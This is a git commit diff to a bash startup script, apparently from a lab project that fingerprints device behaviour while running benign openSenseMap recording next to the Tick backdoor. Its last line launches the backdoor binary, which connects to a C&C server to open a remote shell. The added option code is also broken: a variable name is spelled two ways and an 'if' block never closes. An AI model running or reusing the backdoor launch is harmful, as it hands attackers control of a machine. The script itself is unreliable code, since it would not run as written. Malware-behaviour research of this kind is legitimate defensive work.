d377b81c46ccd5f7eb77bdbea5009f5b75af8266
Patrik <patrikrosenkranz@gmail.com>
2025-05-12 00:20:43 +0200

    removed relative paths from additional benign behavior scripts, included new option for startup script to define if additional benign behaviors are executed or not

--- startup.sh
+++ startup.sh
@@ -1,5 +1,19 @@
 #!/bin/bash
 
+
+############# CONFIGURATION ##########################
+
+# parse options
+benign_processes_active=false
+while getopts "b" opt; do
+	case $opt in
+		b) benign_process_active=true ;;
+		*) echo "Usage $0 [-b   Runs additional benign processes while creating fingerprints.]"; exit 1 ;;
+	esac
+done
+shift $((OPTIND-1))
+
+
 # cleanup procedure when user kills process
 cleanup() {
 	printf "\nCaught termination signal. Killing openSenseMap recording\n"
@@ -9,9 +23,9 @@ cleanup() {
 	ps aux | grep "SCREEN -dmS fingerprinting" | awk '{print $2}' | xargs sudo kill 2>/dev/null
 	exit
 }
-
-# Traü SIGINT (Ctrl+C) and SIGTERM
+# Trap SIGINT (Ctrl+C) and SIGTERM
 trap cleanup SIGINT SIGTERM
+
 
 # load folder paths
 . ./config/folder_paths.config
@@ -19,8 +33,17 @@ trap cleanup SIGINT SIGTERM
 # load app data
 . ./config/app_data.config
 
+######################################################
+
+
+
 # start benign behavior
 screen -dmS openSenseMap $openSenseMap_folder/start_openSenseMap_recording.sh
+
+# start additional benign behavior if option given
+if [ "$benign_process_active" = true ]; then
+	bash package_installation_behavior.sh
+	bash ping_behavior.sh 	
 
 # start listening for C&C server
 $tick_backdoor_folder/bin/ticksvc $ip_of_server $port_of_remote_shell
